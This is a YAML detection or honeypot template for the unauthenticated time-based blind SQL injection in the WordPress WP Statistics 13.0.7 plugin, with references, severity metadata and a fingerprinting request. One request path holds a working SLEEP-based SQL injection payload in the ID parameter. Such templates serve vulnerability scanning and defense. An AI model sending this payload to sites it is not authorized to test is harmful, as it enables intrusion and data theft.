id: wp-statistics-sqli
info:
  name: WordPress WP Statistics Plugin 13.0.7 - SQL Injection
  author: r3Y3r53
  description: 'WordPress Plugin WP Statistics 13.0.7  contains an unauthenticated
    Time based SQL injection vulnerability. The plugin does not sanitize and escape
    the id parameter before using it in a SQL statement, leading to an unauthenticated
    blind SQL injection. An attacker can possibly obtain sensitive information, modify
    data, and/or execute unauthorized administrative operations in the context of
    the affected site.

    '
  severity: high
  reference:
  - https://www.exploit-db.com/exploits/49894
  - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-wp-statistics-sql-injection-13-0-7/
  - https://www.wordfence.com/blog/2021/05/over-600000-sites-impacted-by-wp-statistics-patch/
  - https://wordpress.org/plugins/wp-statistics/
  metadata:
    verified: true
    max-request: 2
    publicwww-query: /wp-content/plugins/wp-statistics/
  tags: sqli,unauth,exploitdb,wp-statistics,wp-plugin,wordpress,wp
traps:
- request:
    method: GET
    path: /wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(6))a)
    headers: null
    body: null
  response:
    status_code: 500
    headers: {}
    body: ''
- request:
    method: GET
    path: /wp-content/plugins/wp-statistics/readme.txt
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: WP Statistics
